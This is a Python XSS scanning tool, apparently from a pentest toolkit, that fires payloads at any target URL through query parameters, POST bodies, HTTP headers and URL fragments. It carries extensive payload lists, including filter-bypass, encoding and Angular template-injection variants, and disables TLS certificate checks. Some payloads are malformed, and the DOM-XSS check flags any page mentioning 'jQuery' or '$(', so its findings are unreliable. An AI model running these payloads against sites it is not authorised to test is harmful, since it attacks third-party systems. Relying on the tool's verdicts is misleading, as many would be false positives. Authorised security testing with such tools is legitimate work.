#!/usr/bin/env python3
"""
Cross-Site Scripting (XSS) Testing Tool
Tests for reflected, stored, and DOM-based XSS vulnerabilities
"""

import sys
import json
import time
import urllib.parse
import urllib.request
import ssl
import html
import re
from urllib.error import URLError

class XSSTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = self._create_session()
        self.vulnerabilities = []

        # XSS payloads based on Apex's ATTACK_KNOWLEDGE
        self.payloads = {
            'basic': [
                '<script>alert(1)</script>',
                '<script>alert("XSS")</script>',
                '<script>confirm(1)</script>',
                '<script>prompt(1)</script>',
                '<svg onload>alert(1)>',
                '<iframe src=javascript:alert(1)>',
                '<body onload>alert(1)>',
                '<input onfocus=alert(1) autofocus>',
                '<select onfocus=alert(1) autofocus><option>x</option></select>',
                '<textarea onfocus=alert(1) autofocus>',
                '<keygen onfocus=alert(1) autofocus>',
                '<video><source onerror=alert(1)>',
                '<audio><source onerror=alert(1)>',
            ],
            'event_handlers': [
                '<img src=x onerror=alert(1)>',
                '<img src=x onError=alert(1)>',
                '<img src="x" onerror="alert(1)">',
                '<body onmouseover=alert(1)>',
                '<div onmouseover=alert(1)>x</div>',
                '<a href=javascript:alert(1)>click</a>',
                '<a href=# onclick=alert(1)>click</a>',
                '<details open ontoggle=alert(1)>',
                '<marquee onstart=alert(1)>',
                '<isindex action=javascript:alert(1) type=submit>',
                '<form><button formaction=javascript:alert(1)>X</button></form>',
            ],
            'attribute_breakout': [
                '"><script>alert(1)</script>',
                "'><script>alert(1)</script>",
                '"><img src=x onerror=alert(1)>',
                "'><img src=x onerror=alert(1)>",
                '"><svg onload=alert(1)>',
                "'><svg onload=alert(1)>",
                '" onmouseover="alert(1)',
                "' onmouseover='alert(1)",
                '"><iframe src=javascript:alert(1)>',
                "'><iframe src=javascript:alert(1)>",
            ],
            'bypass_attempts': [
                # Case variations
                '<ScRiPt>alert(1)</ScRiPt>',
                '<SCRIPT>alert(1)</SCRIPT>',
                '<img SRC=x ONERROR=alert(1)>',
                # Encoding variations
                '%3Cscript%3Ealert(1)%3C/script%3E',
                '&#60;script&#62;alert(1)&#60;/script&#62;',
                '&lt;script&gt;alert(1)&lt;/script&gt;',
                # Obfuscation
                '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
                '<script>alert(/XSS/)</script>',
                '<script>alert(String.fromCharCode(88,83,83))</script>',
                # Alternative tags
                '<link rel=import href=javascript:alert(1)>',
                '<meta http-equiv=refresh content=0;url=javascript:alert(1)>',
                '<object data=javascript:alert(1)>',
                '<embed src=javascript:alert(1)>',
                # HTML5
                '<video poster=javascript:alert(1)>',
                '<audio src=x onerror=alert(1)>',
                '<track src=x onerror=alert(1)>',
            ],
            'context_specific': {
                'javascript_url': [
                    'javascript:alert(1)',
                    'javascript:alert("XSS")',
                    'javascript:confirm(1)',
                    'javascript:void(0);alert(1)',
                ],
                'css_expression': [
                    'expression(alert(1))',
                    'url(javascript:alert(1))',
                    'x:expression(alert(1))',
                ],
                'angular': [
                    '{{$on.constructor(\'alert(1)\')()}}',
                    '{{7*7}}',
                    '{{this.toString().constructor.constructor(\'alert(1)\')()}}',
                ]
            }
        }

    def _create_session(self):
        """Create a simple session-like object"""
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return {'context': ctx}

    def _make_request(self, url, data=None, method='GET', headers=None):
        """Make HTTP request"""
        try:
            if method == 'POST' and data:
                if isinstance(data, dict):
                    encoded_data = urllib.parse.urlencode(data).encode()
                else:
                    encoded_data = data
                req = urllib.request.Request(url, data=encoded_data, method=method)
            else:
                req = urllib.request.Request(url, method=method)

            req.add_header('User-Agent', 'Mozilla/5.0 (compatible; Pentest-Toolkit/1.0)')
            req.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')

            if headers:
                for k, v in headers.items():
                    req.add_header(k, v)

            with urllib.request.urlopen(req, context=self.session['context'], timeout=10) as response:
                content = response.read().decode('utf-8', errors='ignore')
                return {
                    'status': response.status,
                    'headers': dict(response.headers),
                    'content': content,
                    'url': response.geturl()
                }
        except Exception as e:
            return {
                'error': str(e)
            }

    def _check_reflection(self, response, payload):
        """Check if payload is reflected in response"""
        content = response.get('content', '')

        # Check for exact payload
        if payload in content:
            return True, 'Exact payload reflection'

        # Check for URL decoded payload
        decoded_payload = urllib.parse.unquote(payload)
        if decoded_payload in content and decoded_payload != payload:
            return True, 'URL-decoded payload reflection'

        # Check for HTML decoded payload
        html_decoded = html.unescape(payload)
        if html_decoded in content and html_decoded != payload:
            return True, 'HTML-decoded payload reflection'

        # Check for partial reflection (script tags, alert, etc.)
        indicators = ['<script>', 'alert(', 'onerror=', 'onload=', 'javascript:', '<iframe']
        for indicator in indicators:
            if indicator in payload and indicator in content:
                return True, f'Partial reflection: {indicator}'

        return False, None

    def _check_xss_execution(self, response, payload):
        """Analyze response for XSS execution indicators"""
        content = response.get('content', '').lower()

        # Check if our payload is not encoded
        if payload in content:
            # Look for unfiltered dangerous patterns
            dangerous_patterns = [
                '<script>', 'alert(', 'confirm(', 'prompt(',
                'onerror=', 'onload=', 'onmouseover=', 'onclick=',
                'javascript:', '<iframe', '<svg', '<object', '<embed'
            ]

            for pattern in dangerous_patterns:
                if pattern in content and pattern in payload.lower():
                    # Additional check: not inside comments or encoded
                    if not re.search(r'<!--.*?' + re.escape(pattern) + r'.*?-->', content, re.DOTALL):
                        return True, f'Unfiltered {pattern} detected'

        return False, None

    def test_parameter(self, url, param_name):
        """Test a specific parameter for XSS"""
        print(f"\n[*] Testing parameter: {param_name}")

        # Parse URL to extract parameters
        parsed = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed.query)

        for category, payloads in self.payloads.items():
            if category == 'context_specific':
                continue  # Handle separately

            print(f"  [*] Testing {category.replace('_', ' ')}...")

            for payload in payloads[:3]:  # Limit to 3 payloads per category for efficiency
                # Test GET method
                test_params = query_params.copy()
                test_params[param_name] = [payload]

                test_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"

                response = self._make_request(test_url)

                if 'error' not in response:
                    # Check for reflection
                    is_reflected, reflection_reason = self._check_reflection(response, payload)

                    # Check for execution indicators
                    exec_possible, exec_reason = self._check_xss_execution(response, payload)

                    if is_reflected or exec_possible:
                        severity = 'HIGH' if exec_possible else 'MEDIUM'

                        vulnerability = {
                            'type': 'Cross-Site Scripting',
                            'method': 'GET',
                            'parameter': param_name,
                            'url': test_url,
                            'payload': payload,
                            'reflection': reflection_reason,
                            'execution': exec_reason,
                            'severity': severity
                        }
                        self.vulnerabilities.append(vulnerability)

                        print(f"    [!] VULNERABLE: {reflection_reason or exec_reason}")
                        print(f"        Payload: {payload[:50]}...")

                        # Test POST method if GET shows promise
                        post_data = {param_name: payload}
                        post_response = self._make_request(url, post_data, 'POST')

                        if 'error' not in post_response:
                            post_reflected, post_reflection = self._check_reflection(post_response, payload)
                            post_exec, post_exec_reason = self._check_xss_execution(post_response, payload)

                            if post_reflected or post_exec:
                                post_vuln = {
                                    'type': 'Cross-Site Scripting',
                                    'method': 'POST',
                                    'parameter': param_name,
                                    'url': url,
                                    'payload': payload,
                                    'reflection': post_reflection,
                                    'execution': post_exec_reason,
                                    'severity': 'HIGH' if post_exec else 'MEDIUM'
                                }
                                self.vulnerabilities.append(post_vuln)
                                print(f"    [!] Also vulnerable in POST")

                time.sleep(0.2)  # Small delay

    def test_headers(self, url):
        """Test HTTP headers for XSS"""
        print(f"\n[*] Testing HTTP Headers...")

        headers_to_test = {
            'User-Agent': '<script>alert(1)</script>',
            'Referer': '<script>alert(1)</script>',
            'X-Forwarded-For': '<script>alert(1)</script>',
            'X-Real-IP': '<script>alert(1)</script>',
            'Cookie': 'xss=<script>alert(1)</script>',
            'Accept': '<script>alert(1)</script>',
            'Accept-Language': '<script>alert(1)</script>'
        }

        for header, payload in headers_to_test.items():
            print(f"  [*] Testing {header}...")

            response = self._make_request(url, headers={header: payload})

            if 'error' not in response:
                # Check if payload is reflected in response
                if payload in response.get('content', ''):
                    vulnerability = {
                        'type': 'Cross-Site Scripting',
                        'method': 'Header Injection',
                        'parameter': header,
                        'url': url,
                        'payload': payload,
                        'severity': 'MEDIUM'
                    }
                    self.vulnerabilities.append(vulnerability)
                    print(f"    [!] Header {header} reflects payload")

    def test_dom_xss(self, url):
        """Test for DOM-based XSS"""
        print(f"\n[*] Testing for DOM-based XSS...")

        # Test with fragment (hash) parameters
        dom_payloads = [
            '#<script>alert(1)</script>',
            '#<img src=x onerror=alert(1)>',
            '?test=<script>alert(1)</script>#test',
            '?q=123&search=<script>alert(1)</script>#'
        ]

        for payload in dom_payloads:
            test_url = url + payload
            response = self._make_request(test_url)

            # DOM XSS requires JavaScript execution, so we look for potential sinks
            if 'error' not in response:
                content = response.get('content', '')

                # Look for common DOM XSS sinks
                sinks = [
                    'innerHTML', 'outerHTML', 'document.write',
                    'eval(', 'setTimeout(', 'setInterval(',
                    'location.hash', 'location.search',
                    'jQuery', '$(', '$.html('
                ]

                if any(sink in content for sink in sinks):
                    vulnerability = {
                        'type': 'DOM-based XSS',
                        'method': 'Fragment',
                        'url': test_url,
                        'payload': payload,
                        'severity': 'HIGH'
                    }
                    self.vulnerabilities.append(vulnerability)
                    print(f"    [!] DOM XSS possible: {test_url}")

    def discover_parameters(self, url):
        """Discover parameters in the URL"""
        parsed = urllib.parse.urlparse(url)
        return list(urllib.parse.parse_qs(parsed.query).keys())

    def run_xss_test(self):
        """Run comprehensive XSS test"""
        print(f"[*] Starting XSS test for: {self.target_url}")
        print("=" * 60)

        # Discover parameters
        parameters = self.discover_parameters(self.target_url)

        if not parameters:
            print("[-] No parameters found in URL. Testing common parameter names...")
            parameters = ['q', 'search', 'query', 'input', 'text', 'name', 'comment', 'message', 'url']

        print(f"[*] Found parameters to test: {parameters}")

        # Test each parameter
        for param in parameters:
            self.test_parameter(self.target_url, param)

        # Test HTTP headers
        self.test_headers(self.target_url)

        # Test DOM-based XSS
        self.test_dom_xss(self.target_url)

        # Print results
        print("\n" + "=" * 60)
        print(f"[*] XSS Test Complete")
        print(f"[*] Vulnerabilities found: {len(self.vulnerabilities)}")

        if self.vulnerabilities:
            print("\n[VULNERABILITIES]")
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"\n{i}. {vuln['type']}")
                print(f"   Method: {vuln['method']}")
                print(f"   Parameter: {vuln.get('parameter', 'N/A')}")
                print(f"   Severity: {vuln['severity']}")
                print(f"   Payload: {vuln['payload'][:80]}...")
                if vuln.get('reflection'):
                    print(f"   Reflection: {vuln['reflection']}")
                if vuln.get('execution'):
                    print(f"   Execution: {vuln['execution']}")
        else:
            print("\n[+] No XSS vulnerabilities detected")

        # Save results
        results = {
            'target': self.target_url,
            'test_type': 'Cross-Site Scripting',
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'parameters_tested': parameters,
            'vulnerabilities': self.vulnerabilities,
            'vulnerability_count': len(self.vulnerabilities)
        }

        output_file = 'xss_results.json'
        with open(output_file, 'w') as f:
            json.dump(results, f, indent=2)

        print(f"\n[+] Results saved to: {output_file}")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 test_xss.py <target_url>")
        print("Example: python3 test_xss.py https://example.com/search?q=test")
        sys.exit(1)

    target_url = sys.argv[1]

    # Validate URL format
    if not (target_url.startswith('http://') or target_url.startswith('https://')):
        target_url = 'https://' + target_url

    tester = XSSTester(target_url)

    try:
        tester.run_xss_test()
    except KeyboardInterrupt:
        print("\n[!] Test interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()